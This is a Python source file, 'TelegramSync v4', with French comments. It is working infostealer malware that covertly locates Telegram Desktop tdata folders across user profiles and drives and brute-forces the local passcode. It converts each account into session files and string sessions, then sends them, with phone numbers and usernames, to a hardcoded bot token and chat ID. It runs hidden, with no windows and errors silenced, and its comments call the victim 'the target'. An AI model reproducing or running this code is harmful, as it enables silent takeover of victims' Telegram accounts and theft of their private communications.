# -*- coding: utf-8 -*-
"""
TelegramSync v4 - tdata -> .session par compte -> envoi vers ton bot.

Mode fantome : aucune fenetre, aucun popup, aucun dialogue d'erreur.
Ne modifie JAMAIS le tdata de la cible (lecture via copie temporaire).

v4 : capture BaseException (opentele leve des BaseException), excepthook
     silencieux, detection du code d'acces local + bruteforce parallele,
     candidats UWP directs, DIAG compact.

Surcharges : TG_TDATA, TG_PASSCODE, passcodes.txt a cote de l'exe
"""
import os, sys, json, shutil, asyncio, zipfile, tempfile, traceback
import subprocess, time, string
import requests

try:
    import winreg
except ImportError:
    winreg = None

if sys.stdout is None or sys.stderr is None:
    class _Null:
        def write(self, *a): pass
        def flush(self): pass
        def isatty(self): return False
    sys.stdout = sys.stdout or _Null()
    sys.stderr = sys.stderr or _Null()

# ---------------------------------------------------------------- CONFIG
BOT_TOKEN = "8710535929:AAE8JvCbRXQ4wkrsVeKwl3yKhBmhsbxfxPA"
CHAT_ID   = 8425878739

API_ID   = 2040
API_HASH = "b18441a1ff607e10a989891a5462e627"

PASSCODES = [""]

# Si le tdata est chiffre par un code local et qu'aucun passcode ne marche,
# on tente tous les codes numeriques de BRUTE_DIGITS chiffres.
# 4 chiffres = 10000 essais, environ 10 min avec 8 threads.
BRUTE = True
BRUTE_DIGITS = 4
WORKERS = min(8, os.cpu_count() or 4)
# ----------------------------------------------------------------------

WORK = os.path.join(tempfile.gettempdir(), "tgsync")
_NO_WINDOW = 0x08000000 if os.name == "nt" else 0


# ------------------------------------------------------------- chemins
def exe_dir():
    if getattr(sys, "frozen", False):
        return os.path.dirname(os.path.abspath(sys.executable))
    return os.path.dirname(os.path.abspath(sys.argv[0]))


def load_passcodes():
    out = [""]
    for p in [os.environ.get("TG_PASSCODE")] + list(PASSCODES):
        if p is not None and p not in out:
            out.append(p)
    f = os.path.join(exe_dir(), "passcodes.txt")
    if os.path.isfile(f):
        try:
            with open(f, encoding="utf-8-sig") as fh:
                for line in fh:
                    line = line.strip()
                    if line and line not in out:
                        out.append(line)
        except OSError:
            pass
    return out


# ------------------------------------------------------------- bot
def tg_call(method, **kw):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
    r = requests.post(url, timeout=600, **kw)
    r.raise_for_status()
    return r.json()


def tg_text(text):
    try:
        tg_call("sendMessage", data={"chat_id": CHAT_ID, "text": text[:4000]})
    except BaseException:
        pass


def tg_file(path, caption=""):
    with open(path, "rb") as fh:
        tg_call("sendDocument",
                data={"chat_id": CHAT_ID, "caption": caption[:1000]},
                files={"document": fh})


def tg_big(path, caption="", limit=45 * 1024 * 1024):
    if os.path.getsize(path) <= limit:
        tg_file(path, caption)
        return
    with open(path, "rb") as fh:
        i = 0
        while True:
            chunk = fh.read(limit)
            if not chunk:
                break
            part = f"{path}.part{i:02d}"
            with open(part, "wb") as o:
                o.write(chunk)
            tg_file(part, f"{caption} [part {i:02d}]")
            os.remove(part)
            i += 1


def _excepthook(t, v, tb):
    try:
        tg_text("TelegramSync - EXCEPTION\n\n"
                + "".join(traceback.format_exception(t, v, tb)))
    except BaseException:
        pass


# ------------------------------------------------------------- detection
SKIP_DIRS = {"windows", "program files", "program files (x86)", "$recycle.bin",
             "system volume information", "recovery", "perflogs", "msocache",
             "config.msi", "onedrivetemp", "intel", "amd", "nvidia",
             "temp", "tmp", "cache", "cacheddata", "crashpad", "logs",
             "node_modules", ".git", ".cache", "dumps", "emoji", "user_data"}

_PROFILES = None


def is_tdata(p):
    try:
        return os.path.isfile(os.path.join(p, "key_datas"))
    except OSError:
        return False


def profile_roots():
    global _PROFILES
    if _PROFILES is not None:
        return _PROFILES
    roots = []
    if winreg is not None:
        try:
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList")
            i = 0
            while True:
                try:
                    sub = winreg.EnumKey(key, i)
                except OSError:
                    break
                i += 1
                try:
                    with winreg.OpenKey(key, sub) as sk:
                        p, _ = winreg.QueryValueEx(sk, "ProfileImagePath")
                        p = os.path.expandvars(p)
                        if os.path.isdir(p):
                            roots.append(p)
                except OSError:
                    pass
        except OSError:
            pass
    if not roots:
        u = os.environ.get("USERPROFILE")
        if u:
            roots.append(u)
    _PROFILES = roots
    return roots


def store_tdata_paths():
    """Version Microsoft Store : tdata dans LocalCache du package."""
    out = []
    loc = os.environ.get("LOCALAPPDATA") or ""
    pkgs = os.path.join(loc, "Packages")
    if not os.path.isdir(pkgs):
        return out
    try:
        for d in os.listdir(pkgs):
            if "telegram" not in d.lower():
                continue
            for lc in (r"LocalCache\Roaming", r"LocalCache\Local"):
                base = os.path.join(pkgs, d, lc)
                if not os.path.isdir(base):
                    continue
                out.append(os.path.join(base, "tdata"))
                try:
                    for sub in os.listdir(base):
                        s2 = os.path.join(base, sub)
                        if os.path.isdir(s2):
                            out.append(os.path.join(s2, "tdata"))
                except OSError:
                    pass
    except OSError:
        pass
    return out


def candidates():
    c = []
    if len(sys.argv) > 1 and os.path.isdir(sys.argv[1]):
        c.append(sys.argv[1])
    if os.environ.get("TG_TDATA"):
        c.append(os.environ["TG_TDATA"])

    names = ("Telegram Desktop", "Telegram Desktop UWP",
             "TelegramDesktop", "Telegram", "Telegram UWP")
    tds = ("tdata", "tdata#2", "tdata#3")

    for var in ("APPDATA", "LOCALAPPDATA"):
        b = os.environ.get(var)
        if b:
            for n in names:
                for t in tds:
                    c.append(os.path.join(b, n, t))

    for r in profile_roots():
        for sub in (r"AppData\Roaming", r"AppData\Local"):
            for n in names:
                for t in tds:
                    c.append(os.path.join(r, sub, n, t))

    c += store_tdata_paths()

    d = exe_dir()
    for base in (d, os.path.dirname(d), os.getcwd()):
        for t in tds:
            c.append(os.path.join(base, t))
        c.append(os.path.join(base, "Telegram Desktop", "tdata"))

    for L in string.ascii_uppercase:
        root = L + ":\\"
        if not os.path.isdir(root):
            continue
        for n in ("Telegram Desktop", "Telegram"):
            c.append(os.path.join(root, n, "tdata"))
        c.append(os.path.join(root, "tdata"))

    seen, out = set(), []
    for x in c:
        try:
            k = os.path.normcase(os.path.abspath(x))
        except Exception:
            continue
        if k not in seen:
            seen.add(k)
            out.append(x)
    return out


def scan(roots, budget):
    t0 = time.time()
    found = []
    for r in roots:
        if not os.path.isdir(r):
            continue
        for cur, dirs, files in os.walk(r, onerror=lambda e: None):
            if time.time() - t0 > budget:
                return found
            if "key_datas" in files:
                found.append(cur)
                dirs[:] = []
                continue
            dirs[:] = [x for x in dirs if x.lower() not in SKIP_DIRS]
    return found


def find_tdata():
    report = []
    for p in candidates():
        if os.path.isdir(p):
            if is_tdata(p):
                report.append(("OK", p))
                return p, report
            report.append(("dir", p))
        else:
            report.append(("--", p))

    tg_text("Aucun chemin standard. Scan du disque (max 2 min)...")
    roots = list(profile_roots())
    roots += [L + ":\\" for L in string.ascii_uppercase
              if os.path.isdir(L + ":\\")]
    hits = scan(roots, budget=150)
    for h in hits:
        report.append(("SCAN", h))
    if hits:
        return hits[0], report

    for st, p in report:
        if st == "dir":
            return p, report
    return None, report


def diag_text(td, report):
    app = os.environ.get("APPDATA") or ""
    loc = os.environ.get("LOCALAPPDATA") or ""
    pkgs = os.path.join(loc, "Packages")
    store = []
    if os.path.isdir(pkgs):
        try:
            store = [d for d in os.listdir(pkgs) if "telegram" in d.lower()]
        except OSError:
            pass
    cl = "oui" if os.path.isdir(os.path.join(app, "Telegram Desktop")) else "non"
    lines = [
        f"user={os.environ.get('USERNAME')}",
        f"exe={exe_dir()}",
        f"profil_classique={cl}",
        f"packages_store={store}",
        f"trouve={td}",
        "---",
    ]
    interest = [(st, p) for st, p in report if st in ("OK", "dir", "SCAN")]
    lines += [f"{st} {p}" for st, p in interest]
    lines.append(f"(+{len(report) - len(interest)} chemins absents)")
    return "\n".join(lines)[:4000]


# ------------------------------------------------------------- tdata
_SKIP_IN_TDATA = {"user_data", "user_data#2", "user_data#3", "user_data#4",
                  "emoji", "shortcuts", "temp", "webview", "dumps"}


def snapshot_tdata(src, dst):
    shutil.rmtree(dst, ignore_errors=True)
    os.makedirs(dst, exist_ok=True)
    for name in os.listdir(src):
        p = os.path.join(src, name)
        try:
            if os.path.isfile(p):
                shutil.copy2(p, os.path.join(dst, name))
            elif os.path.isdir(p) and name not in _SKIP_IN_TDATA:
                shutil.copytree(p, os.path.join(dst, name), dirs_exist_ok=True)
        except OSError:
            pass
    return dst


def telegram_running():
    try:
        out = subprocess.check_output(
            ["tasklist", "/FI", "IMAGENAME eq Telegram.exe"],
            stderr=subprocess.DEVNULL, creationflags=_NO_WINDOW)
        return b"Telegram.exe" in out
    except Exception:
        return False


def zip_dir(src, dst):
    with zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED) as z:
        for root, _, files in os.walk(src):
            for f in files:
                p = os.path.join(root, f)
                z.write(p, os.path.relpath(p, src))


# ------------------------------------------------------------- conversion
def is_bad_key(e):
    return e is not None and type(e).__name__ == "TDataBadDecryptKey"


def brute_force(tdata, digits=4):
    from opentele.td import TDesktop
    from concurrent.futures import ThreadPoolExecutor

    def one(i):
        code = str(i).zfill(digits)
        try:
            td = TDesktop(tdata, passcode=code)
            if td.accountsCount > 0:
                return code, td
        except BaseException:
            pass
        return None, None

    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
        for code, td in ex.map(one, range(10 ** digits), chunksize=1):
            if td is not None:
                return td, code
    return None, None


def load_tdesktop(tdata, passcodes, brute=True, digits=BRUTE_DIGITS):
    from opentele.td import TDesktop

    last = None
    for pc in passcodes:
        try:
            td = TDesktop(tdata, passcode=pc or None)
            if td.accountsCount > 0:
                return td, pc, None
            last = RuntimeError("0 compte charge")
        except BaseException as e:
            last = e

    if not brute or not is_bad_key(last):
        return None, None, last

    tg_text(f"tdata chiffre par un code local.\n"
            f"Bruteforce {digits} chiffres ({10 ** digits} essais, "
            f"{WORKERS} threads)...")
    t0 = time.time()
    td, code = brute_force(tdata, digits)
    dt = int(time.time() - t0)
    if td is not None:
        tg_text(f"code local trouve : {code} ({dt}s)")
        return td, code, None
    tg_text(f"code local NON trouve ({dt}s, {digits} chiffres essayes).\n"
            f"-> demande le code a la cible, mets-le dans passcodes.txt")
    return None, None, last


async def convert_all(td, outdir):
    from opentele.api import API, UseCurrentSession
    from telethon.sessions import StringSession

    out = []
    for i, acc in enumerate(td.accounts):
        entry = {"index": i}
        client = None
        try:
            client = await acc.ToTelethon(
                session=os.path.join(outdir, f"account_{i}"),
                flag=UseCurrentSession,
                api=API.TelegramDesktop,
            )
            await client.connect()
            if not await client.is_user_authorized():
                raise RuntimeError("session non autorisee")
            me = await client.get_me()
            entry.update({
                "file": f"account_{i}.session",
                "id": me.id,
                "phone": me.phone,
                "username": me.username,
                "first_name": me.first_name,
                "last_name": me.last_name,
                "dc_id": client.session.dc_id,
                "string_session": StringSession.save(client.session),
            })
        except BaseException as e:
            entry["error"] = repr(e)
        finally:
            if client is not None:
                try:
                    await client.disconnect()
                except BaseException:
                    pass
        out.append(entry)
    return out


def run_once(tdata, passcodes, snap, brute):
    snapshot_tdata(tdata, snap)
    td, used, err = load_tdesktop(snap, passcodes, brute=brute)
    if td is None:
        raise RuntimeError(f"tdata illisible : {err!r}")
    return asyncio.run(convert_all(td, WORK)), used


# ------------------------------------------------------------- main
def main():
    tdata, report = find_tdata()
    tg_text("DIAG\n" + diag_text(tdata, report))

    if not tdata:
        tg_text("RESULTAT: aucun tdata.\n"
                "Telegram Desktop absent, jamais lance, ou autre profil.")
        return

    if not is_tdata(tdata):
        tg_text(f"RESULTAT: {tdata} existe mais sans key_datas.\n"
                "Telegram Desktop n'a jamais ete lance/connecte.")
        return

    shutil.rmtree(WORK, ignore_errors=True)
    os.makedirs(WORK, exist_ok=True)
    snap = os.path.join(WORK, "tdata_snap")

    accounts, used, last = None, None, None
    for attempt in range(3):
        try:
            accounts, used = run_once(tdata, load_passcodes(), snap,
                                      brute=(BRUTE and attempt == 2))
            if accounts:
                break
        except BaseException as e:
            last = e
            if attempt < 2:
                time.sleep(2)

    if not accounts:
        if is_bad_key(last):
            tg_text("RESULTAT: code d'acces local non resolu.\n"
                    "-> demande le code a la cible.")
        raise RuntimeError(f"conversion impossible : {last!r}")

    manifest = os.path.join(WORK, "manifest.json")
    with open(manifest, "w", encoding="utf-8") as f:
        json.dump(accounts, f, indent=2, ensure_ascii=False)

    z = os.path.join(tempfile.gettempdir(), "sessions.zip")
    zip_dir(WORK, z)

    ok = [a for a in accounts if "error" not in a]
    tg_big(z, f"session(s) - {len(ok)}/{len(accounts)} compte(s)")
    tg_text(
        f"source : {tdata}\n"
        f"passcode : {'oui' if used else 'non'}\n"
        f"Telegram ouvert : {'oui' if telegram_running() else 'no'}\n"
        "comptes:\n" + "\n".join(
            f"- #{a['index']} {a.get('phone','?')} @{a.get('username') or '-'}"
            + (" [ECHEC]" if "error" in a else "")
            for a in accounts))


if __name__ == "__main__":
    sys.excepthook = _excepthook
    try:
        main()
    except BaseException:
        tg_text("TelegramSync - ERREUR\n\n" + traceback.format_exc())
